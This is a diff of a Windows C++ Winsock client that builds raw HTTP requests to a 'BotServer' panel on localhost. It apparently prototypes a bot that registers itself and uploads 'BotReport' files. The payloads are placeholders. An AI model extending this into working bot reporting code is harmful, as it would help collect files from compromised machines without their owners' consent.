@@ -1,16 +1,15 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
-#pragma comment(lib,"ws2_32.lib")
 #include <winsock.h>
 #include <fstream>
 
 using namespace std;
+#pragma comment(lib,"ws2_32.lib")
+
+
 
 int main (){
-
-
-
 
 	ofstream ofs("new.txt", ofstream::out);     
 
@@ -90,52 +89,39 @@ int main (){
 
 	//char sendString [] = "GET /BotServer/ HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n";
 	
-	char sendString1 [] ="POST /BotServer/index.php/Bot_c/catchFile HTTP/1.1"
-                         "\r\nHost: localhost"
-	                     "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1"
-                         "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-						 "\r\nAccept-Language: en-us,en;q=0.5"
-						 "\r\nAccept-Encoding: gzip, deflate"
-						 "\r\nConnection: keep-alive"
-						 "\r\nReferer: localhost/BotServer/index.php/bot_C/showcatchFileForm/"
-						 "\r\nContent-Type: multipart/form-data; boundary=---------------------------98942870323811"
-						 "\r\nContent-Length: 324"
-
-						 "\r\n\r\n-----------------------------98942870323811"
-						 "\r\nContent-Disposition: form-data; name='BotReport'; filename='new.txt'"
-						 "\r\nContent-Type: text/plain"
-
-						 "\r\n\r\nThisTextMustbeSend!"
-						 "\r\n-----------------------------98942870323811"
-						 "\r\nContent-Disposition: form-data; name='submit'"
-
-						 "\r\n\r\nTransmit Report !"
-						 "\r\n-----------------------------98942870323811--"
-                         "\r\n";
-
-
-
-
-	char sendString2 [] = "POST /BotServer/index.php/Bot_c/RegisterBot HTTP/1.1\r\n"
-                          "Host: localhost\r\n"
-	                      "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n"
-                          "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-						  "Accept-Language: en-us,en;q=0.5\r\n"
-						  "Accept-Encoding: gzip, deflate\r\n"
-						  "Connection: keep-alive\r\n"
-						  "Referer: localhost/BotServer/index.php/bot_C/showRegisterForm/\r\n"
-						  "Content-Type: application/x-www-form-urlencoded\r\n"
-						  "Content-Length: 66\r\n\r\n"
-						  "ip=192.23.34.12&systemVersion=CnewOs&submit=Register+Bot+please%23";
-
-
+	char sendStringP1 [] = "POST /BotServer/index.php/Bot_c/catchFile HTTP/1.1\r\n"
+                            "Host: localhost\r\n"
+	                        "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n"
+                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+							"Accept-Language: en-us,en;q=0.5\r\n"
+							"Accept-Encoding: gzip, deflate\r\n"
+							"Connection: keep-alive\r\n"
+							"Referer: localhost/BotServer/index.php/bot_C/showcatchFileForm/\r\n"
+							"Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
+	
+	char sendStringP2 [] =  "Content-Length: 314";
 
 	
+	char sendStringP3 [] =	"\r\n\r\n-----------------------------41184676334\r\n"
+							"Content-Disposition: form-data; name='BotReport'; filename='test.txt'\r\n"
+							"Content-Type: text/plain\r\n\r\n";
 
-	//printf(sendString );
+	char sendStringP4 [] =	"dsfsfsfsfsfsfsfsf";
+	
+	char sendStringP5 [] =	"\r\n-----------------------------41184676334"
+							"\r\nContent-Disposition: form-data; name='submit'"
 
-	send(Socket, sendString1, strlen(sendString1),0);
-	//send(Socket, sendString2, strlen(sendString2),0);
+							"\r\n\r\nTransmit Report !"
+							"\r\n-----------------------------41184676334--\r\n";
+
+	char sendString [1000];
+	sprintf(sendString , "%s%s%s%s%s" , sendStringP1,sendStringP2,sendStringP3,sendStringP4,sendStringP5);
+
+
+	printf(sendString );
+
+	send(Socket, sendString, strlen(sendString),0);
+	
 
 	
 
